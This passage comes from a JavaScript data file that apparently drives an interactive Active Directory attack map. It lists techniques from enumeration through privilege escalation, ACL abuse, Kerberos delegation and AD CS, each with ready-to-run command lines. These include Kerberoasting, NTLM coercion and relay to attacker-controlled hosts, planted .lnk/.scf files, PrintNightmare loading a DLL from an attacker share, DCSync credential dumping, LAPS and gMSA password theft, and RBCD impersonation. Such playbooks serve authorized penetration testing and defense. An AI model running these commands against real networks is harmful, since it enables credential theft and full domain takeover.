          outcomes: [{ label: "ADCS Exploitation", color: "#c084fc" }],
          moveTo: []
        },
        {
          id: "vc-enum-sccm",
          title: "Enumerate SCCM",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Locate SCCM/MECM site systems and management points for later abuse.",
          cmds: [
            "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
            "SharpSCCM.exe local site-info"
          ],
          outcomes: [{ label: "SCCM Exploitation", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "vc-scan-auto",
          title: "Scan Auto",
          theory: null,
          cve: null,
          desc: "Run automated review tools to surface attack paths and misconfigurations.",
          cmds: [
            "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
            "PingCastle.exe --healthcheck --server <domain>",
            "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "vc-kerberoasting",
          title: "Kerberoasting",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "Request service tickets for SPN accounts and crack them offline. Exclude machine and (g)MSA accounts.",
          cmds: [
            "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
            "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
            "Rubeus.exe kerberoast"
          ],
          outcomes: [{ label: "Hash TGS", color: "#e8912e" }],
          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the TGS offline to recover the service account password" }]
        },
        {
          id: "vc-drop-file",
          title: "Drop file (forced authentication)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Plant files on writable shares that trigger authentication to your host when a user browses the folder.",
          cmds: [],
          branches: [
            { label: ".lnk", cmds: ["nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>"] },
            { label: ".scf", cmds: ["nxc smb <dc_ip> -u '<user>' -p '<password>' -M scuffy -o NAME=<filename> SERVER=<attacker_ip>"] },
            { label: ".url", cmds: ["[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon"] },
            { label: "Other files", cmds: ["ntlm_theft.py -g all -s <your_ip> -f test"] }
          ],
          outcomes: [{ label: "SMB NTLM Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "capture or relay the forced authentication" }]
        },
        {
          id: "vc-webdav",
          title: "WebDAV (HTTP coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Force HTTP authentication (relayable cross-protocol) by enabling WebClient and coercing to your host.",
          cmds: [],
          branches: [
            { label: "Enable WebClient", cmds: [".searchConnector-ms", "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc"] },
            { label: "Add attacker computer in DNS", cmds: ["dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>"] },
            { label: "Launch coerce with <attacker_hostname>@80/x as target", outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }] }
          ],
          outcomes: [],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced HTTP authentication to LDAP(S)/AD CS" }]
        },
        {
          id: "vc-rpc-coerce",
          title: "RPC call (NTLM coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Coerce a host (often a DC) over MS-RPRN / MS-EFSR to authenticate to your listener.",
          cmds: [
            "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
            "petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>",
            "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>"
          ],
          outcomes: [{ label: "SMB NTLM Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced SMB authentication" }]
        },
        {
          id: "vc-coerce-kerberos",
          title: "Coerce Kerberos",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Add a DNS record for an attacker hostname encoding a Kerberos SPN, then coerce Kerberos authentication to it.",
          cmds: [
            "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
            "petitpotam.py -u '<user>' -p '<password>' -d <domain> <servername>1UWh... <target>"
          ],
          outcomes: [{ label: "SMB Kerberos Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Kerberos relay", note: "relay the coerced Kerberos authentication" }]
        },
        {
          id: "vc-intra-id",
          title: "Intra ID Connect (find MSOL)",
          theory: null,
          cve: null,
          desc: "Locate the Entra/Azure AD Connect sync (MSOL) account, whose credentials are often recoverable and highly privileged.",
          cmds: [
            "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users | grep -i MSOL"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "vc-can-connect",
          title: "Can connect to a computer",
          theory: null,
          cve: null,
          desc: "Your credential grants a session on a host — move laterally and continue from there.",
          cmds: [],
          outcomes: [{ label: "Lateral move", color: "#9ca3af" }],
          moveTo: [{ section: "low-access", label: "Privilege escalation", note: "once on the host, escalate locally" }]
        },
        {
          id: "vc-exploit",
          title: "Exploit",
          theory: null,
          cve: null,
          desc: "Known authenticated vulnerabilities may apply to this domain.",
          cmds: [],
          outcomes: [],
          moveTo: [{ section: "known-vulns-auth", label: "Known vulnerabilities (authenticated)", note: "try the authenticated CVEs" }]
        }
      ]
    },

    {
      id: "low-access",
      title: "Low access (Privilege escalation)",
      color: "#c9c1e8",
      tag: "Local privesc",
      desc: "You have a foothold on a host as a low-privileged user. Escalate to local admin / SYSTEM through misconfigurations, bypasses, and impersonation.",
      techniques: [
        {
          id: "la-bypass-applocker",
          title: "Bypass AppLocker",
          theory: null,
          cve: null,
          desc: "Enumerate AppLocker rules and abuse writable paths or trusted LOLBins to run code.",
          cmds: [],
          branches: [
            { label: "Get AppLocker info", cmds: ["Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)"] },
            { label: "Files in writable paths", cmds: ["C:\\Windows\\Temp", "C:\\Windows\\Tasks"] },
            { label: "LOLBin execution", cmds: [
              "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
              "mshta.exe my.hta",
              "MsBuild.exe pshell.xml"
            ] }
          ],
          outcomes: [{ label: "Low access (without AppLocker)", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "la-uac-bypass",
          title: "UAC bypass",
          theory: null,
          cve: null,
          desc: "Abuse auto-elevating binaries to run code at high integrity.",
          cmds: [
            "Fodhelper.exe",
            "wsreset.exe",
            "msdt.exe"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-auto-enum",
          title: "Auto enum",
          theory: null,
          cve: null,
          desc: "Run automated privilege-escalation checks.",
          cmds: [
            "winPEASany_ofs.exe",
            ".\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-search-files",
          title: "Search files",
          theory: null,
          cve: null,
          desc: "Grep the filesystem for stored passwords in scripts, configs, and documents.",
          cmds: [
            "findstr /si 'pass' *.txt *.xml *.docx *.ini"
          ],
          outcomes: [{ label: "User Account", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "la-exploit",
          title: "Exploit",
          theory: null,
          cve: null,
          desc: "Local privilege-escalation vulnerabilities.",
          cmds: [],
          branches: [
            { label: "SMBGhost", cve: "CVE-2020-0796", note: "SMBv3 compression local privilege escalation." },
            { label: "HiveNightmare / SeriousSAM", cve: "CVE-2021-36934", cmds: ["vssadmin list shadows"] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-webdav",
          title: "WebDAV (HTTP coercion)",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Trigger HTTP authentication from the host to your listener for relaying.",
          cmds: [
            "open file <file>.searchConnector-ms",
            "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
            "petitpotam.py -u '<user>' -p <pass> -d <domain> \"attacker@80/random.txt\" <ip>"
          ],
          outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the coerced HTTP authentication" }]
        },
        {
          id: "la-kerberos-relay",
          title: "Kerberos Relay",
          theory: null,
          cve: null,
          desc: "Relay local Kerberos authentication to LDAP to configure RBCD on the machine account and gain SYSTEM.",
          cmds: [
            "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
            "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "la-seimpersonate",
          title: "From service account (SeImpersonate)",
          theory: null,
          cve: null,
          desc: "A service account holding SeImpersonatePrivilege can be escalated to SYSTEM with a Potato technique.",
          cmds: [],
          branches: [
            { label: "RoguePotato" },
            { label: "GodPotato" },
            { label: "PrintSpoofer" },
            { label: "RemotePotato0" }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "known-vulns-auth",
      title: "Known vulnerabilities (authenticated)",
      color: "#f0c988",
      tag: "Authenticated CVEs",
      desc: "With a valid domain account, a set of well-known CVEs can escalate straight to Domain Admin. Scan first, then exploit what applies.",
      techniques: [
        {
          id: "kv-ms14-068",
          title: "MS14-068",
          theory: null,
          cve: { id: "MS14-068", label: "Kerberos PAC forgery" },
          desc: "Forge a PAC to grant yourself Domain Admin group membership in a Kerberos ticket.",
          cmds: [
            "findSMB2UPTime.py <ip>"
          ],
          branches: [
            { label: "Python", cmds: ["ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>"] },
            { label: "Metasploit", cmds: ["msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"] },
            { label: "goldenPac", cmds: ["goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target"] }
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "Domain admin", color: "#ef4444" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "kv-gpp",
          title: "GPP MS14-025",
          theory: null,
          cve: { id: "MS14-025", label: "Group Policy Preferences password" },
          desc: "Group Policy Preferences stored an AES-encrypted password with a published key. Anyone who can read SYSVOL can decrypt it.",
          cmds: [
            "msf> use auxiliary/scanner/smb/smb_enum_gpp",
            "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
            "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>"
          ],
          outcomes: [{ label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-privexchange",
          title: "PrivExchange",
          theory: null,
          cve: { id: "CVE-2019-0724", label: "PrivExchange (also CVE-2019-0686)" },
          desc: "Exchange pushes authentication to your host, which you relay to LDAP to grant DCSync rights.",
          cmds: [
            "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>"
          ],
          outcomes: [{ label: "HTTP Coerce", color: "#ffe14a" }, { label: "Domain admin", color: "#ef4444" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the Exchange authentication to LDAP" }]
        },
        {
          id: "kv-nopac",
          title: "noPac (sAMAccountName spoofing)",
          theory: null,
          cve: { id: "CVE-2021-42287", label: "noPac (with CVE-2021-42278)" },
          desc: "Abuse sAMAccountName spoofing to impersonate a DC and obtain a privileged ticket.",
          cmds: [
            "nxc smb <ip> -u 'user' -p 'pass' -M nopac   # scan",
            "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt"
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-printnightmare",
          title: "PrintNightmare",
          theory: null,
          cve: { id: "CVE-2021-1675", label: "PrintNightmare (with CVE-2021-34527)" },
          desc: "Abuse the Print Spooler to load a malicious DLL and run code as SYSTEM.",
          cmds: [
            "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare   # scan",
            "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>'"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "kv-certifried",
          title: "Certifried",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: { id: "CVE-2022-26923", label: "Certifried" },
          desc: "Abuse a machine-account certificate request to impersonate a DC and DCSync.",
          cmds: [],
          branches: [
            { label: "Create account", cmds: ["certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc$' -pass 'certifriedpass' -dns '<fqdn_dc>'"] },
            { label: "Request", cmds: ["certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine"] },
            { label: "Authentication", cmds: ["certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"] }
          ],
          outcomes: [{ label: "PTT", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain admin", color: "#ef4444" }],
          moveTo: []
        },
        {
          id: "kv-proxynotshell",
          title: "ProxyNotShell",
          theory: null,
          cve: { id: "CVE-2022-41040", label: "ProxyNotShell (with CVE-2022-41082)" },
          desc: "Authenticated Exchange SSRF chained to PowerShell remoting for code execution.",
          cmds: [
            "poc_aug3.py <host> <username> <password> <command>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "acls-aces",
      title: "ACLs / ACEs permissions",
      color: "#2f6bed",
      tag: "Abuse rights",
      desc: "BloodHound has revealed abusable rights over objects. Each ACE type has a matching abuse — take ownership, add members, set shadow credentials, or DCSync.",
      techniques: [
        {
          id: "acl-dcsync",
          title: "DCSync",
          theory: null,
          cve: null,
          desc: "Replicate directory secrets. Granted to Administrators, Domain Admins, Enterprise Admins, and Domain Controller computer accounts — or anyone with the DS-Replication rights.",
          cmds: [
            "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
            "secretsdump.py '<domain>/<user>:<password>@<domain_controller>'"
          ],
          outcomes: [{ label: "Domain Admin", color: "#ef4444" }, { label: "Lateral move", color: "#9ca3af" }, { label: "Crack hash", color: "#e8912e" }],
          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the dumped hashes offline" }]
        },
        {
          id: "acl-shadow-creds",
          title: "Change msDS-KeyCredentialLink (GenericWrite) + ADCS",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "With write access to the target's Key Credentials and PKINIT available, add a shadow credential and authenticate as that object.",
          cmds: [
            "certipy shadow auto -u <user>@<domain> -p <password> -account <target_account>",
            "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\""
          ],
          outcomes: [{ label: "PassTheCertificate", color: "#aebdd0" }],
          moveTo: []
        },
        {
          id: "acl-on-group",
          title: "On a Group",
          theory: null,
          cve: null,
          desc: "Rights over a group let you add yourself (or a controlled account) as a member.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite / Self / AddExtended Rights", note: "Add a member to the group." },
            { label: "Write Owner", note: "Grant yourself ownership, then set rights." },
            { label: "WriteDACL + WriteOwner", note: "Grant rights, then give yourself GenericAll." }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-computer",
          title: "On a Computer",
          theory: null,
          cve: null,
          desc: "Rights over a computer object enable RBCD or shadow credentials for a takeover.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite → msDS-AllowedToActOnBehalfOfOtherIdentity", outcomes: [{ label: "RBCD", color: "#12b886" }] },
            { label: "GenericAll / GenericWrite → add Key Credentials", outcomes: [{ label: "Shadow credentials", color: "#60b5ef" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-user",
          title: "On a User",
          theory: null,
          cve: null,
          desc: "Rights over a user account allow password reset, targeted Kerberoasting, shadow credentials, or logon-script abuse.",
          cmds: [],
          branches: [
            { label: "GenericAll / GenericWrite → Change password", cmds: ["net user <user> <password> /domain"], outcomes: [{ label: "User with clear text pass", color: "#4ade80" }] },
            { label: "GenericAll / GenericWrite → add SPN (targeted Kerberoasting)", cmds: ["targetedKerberoast.py -d <domain> -u <user> -p <pass>"], outcomes: [{ label: "Hash found (TGS)", color: "#e8912e" }] },
            { label: "GenericAll / GenericWrite → add Key Credentials", outcomes: [{ label: "Shadow credentials", color: "#60b5ef" }] },
            { label: "GenericAll / GenericWrite → login script", outcomes: [{ label: "Access", color: "#9ca3af" }] },
            { label: "ForceChangePassword", cmds: ["net user <user> <password> /domain"], outcomes: [{ label: "User with clear text pass", color: "#4ade80" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-on-ou",
          title: "On an OU",
          theory: null,
          cve: null,
          desc: "Rights over an organizational unit let you push inherited ACEs or abuse linked GPOs against every object inside.",
          cmds: [],
          branches: [
            { label: "WriteDacl → ACE Inheritance → Grant rights", note: "Push an inheritable ACE onto child objects." },
            { label: "GenericAll / GenericWrite / Manage Group Policy Links", cmds: ["OUned.py --config config.ini"] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-readgmsa",
          title: "ReadGMSAPassword",
          theory: null,
          cve: null,
          desc: "Read the managed password blob of a gMSA you are allowed to retrieve, and compute its NT hash.",
          cmds: [
            "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'",
            "nxc ldap <ip> -u <user> -p <pass> --gmsa",
            "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-laps",
          title: "Get LAPS passwords",
          theory: null,
          cve: null,
          desc: "Principals allowed to read LAPS can recover the local administrator password of managed hosts.",
          cmds: [],
          branches: [
            { label: "Who can read LAPS", cmds: ["MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p"] },
            { label: "Read LAPS", cmds: [
              "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
              "foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name | where {$objcomputer.name -ne $env:computername} | %{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}",
              "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
              "msf> use post/windows/gather/credentials/enum_laps"
            ] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "acl-gpo",
          title: "GPO",
          theory: null,
          cve: null,
          desc: "Write access to a GPO (or to a GP-Link on an OU) lets you push a malicious policy to every affected host or user.",
          cmds: [],
          branches: [
            { label: "Who can control GPOs", cmds: ["MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p"] },
            { label: "SID of principals that can create new GPOs in the domain", cmds: [
              'Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl'
            ] },
            { label: "Principals that can write to the GP-Link attribute on OUs", cmds: [
              'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl'
            ] },
            { label: "Generic Write on GPO → Abuse GPO", outcomes: [{ label: "Access", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "acl-dnsadmin",
          title: "DNS Admin",
          theory: null,
          cve: { id: "CVE-2021-40469", label: "DnsAdmins DLL injection" },
          desc: "A member of DnsAdmins can load an arbitrary DLL into the DNS service (running as SYSTEM on the DC) and restart it.",
          cmds: [
            "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll>   # needs a DnsAdmins user",
            "sc \\\\DNSServer stop dns && sc \\\\DNSServer start dns"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "kerberos-delegation",
      title: "Kerberos Delegation",
      color: "#26bd8a",
      tag: "Impersonate via delegation",
      desc: "Delegation lets one account act on behalf of another. Unconstrained, constrained, and resource-based delegation each offer a path to impersonate privileged users and reach SYSTEM or Domain Admin.",
      techniques: [
        {
          id: "kd-find",
          title: "Find delegation",
          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-delegation.html" },
          cve: null,
          desc: "Locate accounts and computers configured for delegation.",
          cmds: [
            "findDelegation.py \"<domain>/'<user>':'<password>'\""
          ],
          branches: [
            { label: "BloodHound — unconstrained (computers)", cmds: ["MATCH (c:Computer {unconstraineddelegation:true}) RETURN c"] },
            { label: "BloodHound — unconstrained (users)", cmds: ["MATCH (c:User {unconstraineddelegation:true}) RETURN c"] },
            { label: "BloodHound — constrained", cmds: ["MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p"] },
            { label: "BloodHound — path to a target", cmds: ['MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN p'] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kd-unconstrained",
          title: "Unconstrained delegation",
          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-delegation.html" },
          cve: null,
          desc: "A host trusted for unconstrained delegation caches the TGT of anyone who authenticates to it (UAC flag ADS_UF_TRUSTED_FOR_DELEGATION). Coerce a DC to it, then dump the tickets.",
          cmds: [],
          branches: [
            { label: "Force a connection with coercion, then dump tickets", cmds: [
              "mimikatz privilege::debug sekurlsa::tickets /export",
              "Rubeus.exe dump /service:krbtgt /nowrap",
              "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
              "Rubeus.exe monitor /interval:5"
            ], outcomes: [{ label: "Kerberos TGT", color: "#9ca3af" }, { label: "PassTheTicket", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: [{ section: "no-creds", label: "Coerce", note: "use a coercion technique to force the DC to authenticate" }]
        },
        {
          id: "kd-constrained",
          title: "Constrained delegation",
          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-delegation.html" },
          cve: null,
          desc: "An account with msDS-AllowedToDelegateTo can request tickets to the listed SPNs as any user via S4U.",
          cmds: [],
          branches: [
            { label: "With protocol transition (TRUST_TO_AUTH_FOR_DELEGATION) — Rubeus", cmds: [
              "Rubeus.exe hash /password:<password>",
              "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES256_hash>",
              "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt"
            ], note: "S4U2self then S4U2proxy. Altservice can be HTTP / HOST / CIFS / LDAP.", outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
            { label: "With protocol transition — Impacket", cmds: [
              "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>"
            ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
            { label: "Without protocol transition (TRUSTED_FOR_DELEGATION) — add computer", cmds: [
              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <domain_netbios> '<domain>/<user>:<password>'"
            ], note: "Kerberos-only: constrain between Y and Z, add a computer X, set RBCD from X to Y, then chain S4U2self / S4U2proxy for a forwardable TGS." },
            { label: "Without protocol transition — RBCD with the added computer", cmds: [
              "rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' '<domain>/<constrained>$'",
              "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'",
              "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>"
            ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
            { label: "Self RBCD", note: "Like RBCD but without adding a computer account." }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kd-rbcd",
          title: "Resource-Based Constrained Delegation (RBCD)",
          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-delegation.html" },
          cve: null,
          desc: "Write access to a target's msDS-AllowedToActOnBehalfOfOtherIdentity lets a computer you control impersonate any user to that target.",
          cmds: [],
          branches: [
            { label: "Add a computer account", cmds: [
              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <domain_netbios> '<domain>/<user>:<password>'"
            ] },
            { label: "RBCD with the added computer — Rubeus", cmds: [
              "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
              "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES256_hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt"
            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
            { label: "RBCD with the added computer — Impacket", cmds: [
              "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' '<domain>/<user>:<password>'",
              "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>"
            ], outcomes: [{ label: "Kerberos TGT", color: "#9ca3af" }, { label: "Admin", color: "#f4b6b6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kd-s4u2self",
          title: "S4U2self abuse",
          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-delegation.html" },
          cve: null,
          desc: "With a machine account's key, request a service ticket to itself as any user (including a local admin) using S4U2self.",
          cmds: [
            "getTGT.py -dc-ip <dc_ip> -hashes :<machine_hash> \"<domain>/'<machine>$'\"",
            "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>/'<machine>$'\""
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        }
      ]
    },

    {
      id: "adcs",
      title: "AD CS (Certificate Services)",
      color: "#c026d3",
      tag: "ESC1–ESC15",
      desc: "Active Directory Certificate Services misconfigurations (the ESC series). A vulnerable template, CA, or ACL lets you enrol a certificate as a privileged user and authenticate as them — often straight to Domain Admin.",
      techniques: [
        {
          id: "adcs-enum",
          title: "Enumeration",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "Enumerate templates, CAs, and PKI objects to find the vulnerable ESC condition.",
          cmds: [
            "certutil -v -dsTemplate",
            "certify.exe find [/vulnerable]",
            "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
            "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
            "certify.exe pkiobjects",
            "certutil -TCAInfo",
            "certify.exe cas"
          ],
          outcomes: [
            { label: "Web enrollment", color: "#c084fc" },
            { label: "Vulnerable template", color: "#c084fc" },
            { label: "Vulnerable CA", color: "#c084fc" },
            { label: "Misconfigured ACL", color: "#c084fc" },
            { label: "Vulnerable PKI Object AC", color: "#c084fc" }
          ],
          moveTo: []
        },
        {
          id: "adcs-esc8",
          title: "ESC8 — Web Enrollment is up",
          theory: null,
          cve: null,
          desc: "Relay NTLM authentication to the CA web-enrollment endpoint, obtain a certificate for a privileged account, then authenticate with it.",
          cmds: [],
          branches: [
            { label: "Relay with ntlmrelayx, then use the certificate", cmds: [
              "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
              "gettgtpkinit.py <domain>/<dc_name>$ <ccache_file>"
            ] },
            { label: "Relay with certipy", cmds: [
              "certipy relay -target http://<ip_ca>",
              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
            ] }
          ],
          outcomes: [{ label: "Pass the ticket", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "LDAP shell", color: "#9ca3af" }, { label: "Domain admin", color: "#ef4444" }],
